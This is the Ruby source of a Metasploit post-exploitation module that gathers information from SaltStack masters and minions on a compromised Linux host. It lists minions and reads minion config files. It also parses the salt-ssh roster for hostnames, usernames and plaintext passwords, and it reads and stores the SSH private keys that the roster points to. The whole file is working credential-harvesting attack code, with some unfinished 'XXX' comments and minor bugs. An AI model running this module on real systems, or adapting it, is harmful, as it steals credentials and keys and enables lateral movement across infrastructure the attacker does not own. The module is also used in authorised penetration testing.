##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'yaml'

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'SaltStack Information Gatherer',
        'Description'    => 'This module gathers information from SaltStack masters and minions',
        'Author'         => [
          'h00die',
          'c2Vlcgo'
        ],
        'SessionTypes'  => %w(shell meterpreter),
        'License'        => MSF_LICENSE,
      )
    )
  end

  def get_minions
    # pull minions from a master
    print_status('Attempting to list minions')
    unless command_exists?('salt-key')
      print_error('salt-key not present on system')
      return
    end
    begin
      minions = YAML.load(cmd_exec('salt-key -L --output=yaml'))
    rescue Psych::SyntaxError
      print_error('Unable to load salt-key -L data')
      return
    end

    tbl = Rex::Text::Table.new(
      'Header'  => 'Minions List',
      'Indent'   => 1,
      'Columns' => ['Status', 'Minion Name']
    )

    store_path = store_loot('saltstack_minions', "application/x-yaml", session, minions.to_yaml, "minions.yaml", "SaltStack salt-key list")
    print_good("#{peer} - minion file successfully retrieved and saved on #{store_path}")
    # XXX check these
    minions['minions'].each do |minion|
      tbl << ['Accepted', minion]
    end
    minions['minions_pre'].each do |minion|
      tbl << ['Unaccepted', minion]
    end
    minions['minions_rejected'].each do |minion|
      tbl << ['Rejected', minion]
    end
    minions['minions_denied'].each do |minion|
      tbl << ['Denied', minion]
    end
    print_good(tbl.to_s)
  end

  def minion
    # XXX ask salt for minion file?
    print_status('Looking for salt minion config files')
    [ '/usr/local/etc/salt/minion', # freebsd
      '/etc/salt/minion']. each do |config|
      next unless file?(config)
      minion = YAML.load(read_file(config))
      if minion['master']
        print_good("Minion master: #{minion['master']}")
      end
      store_path = store_loot('saltstack_minion', "application/x-yaml", session, minion.to_yaml, "minion.yaml", "SaltStack Minion File")
      print_good("#{peer} - minion file successfully retrieved and saved on #{store_path}")
    end
  end

  def master
    get_minions

    # get sls files
    unless command_exists?('salt')
      print_error('salt not found on system')
      return
    end
    print_status('Show SLS XXX')
    puts cmd_exec("salt '*' state.show_sls '*'")
    # XXX do what with this info...

    # get roster
    # XXX ask salt where the roster file is
    # https://docs.saltstack.com/en/latest/topics/ssh/roster.html
    print_status('Loading roster')
    priv_to_retrieve = []
    ['/etc/salt/roster'].each do |config|
      next unless file?(config)
      begin
        minions = YAML.load(read_file(config))
      rescue Psych::SyntaxError
        print_error("Unable to load #{config}")
        next
      end
      next if minions == false
      minions.each do |minion|
        host = minion['host']
        user = minion['user']
        passwd = minion['passwd']
        sudo = minion['sudo'] || false
        priv = minion['priv'] || false
        unless priv_to_retrieve.include?(priv)
          priv_to_retrieve.append(priv)
        end
        priv_pass = minion['priv_passwd'] || false
        print_good("Minion master: #{minion['master']}")
      end
      store_path = store_loot('saltstack_roster', "application/x-yaml", session, minion.to_yaml, "roster.yaml", "SaltStack Roster File")
      print_good("#{peer} - roster file successfully retrieved and saved on #{store_path}")
    end
    priv_to_retrieve.each do |f|
      input = read_file(f)
      store_path = store_loot('ssh_key', "plain/txt", session, input, "salt-ssh.rsa", "SaltStack SSH Private Key")
      print_good("#{peer} - roster file successfully retrieved and saved on #{store_path}")
    end
  end

  def run
    if session.platform == 'windows'
      fail_with(Failure::Unknown, 'This module does not support windows')
    end
    minion if command_exists?('salt-minion')
    master if command_exists?('salt-master')
  end

end
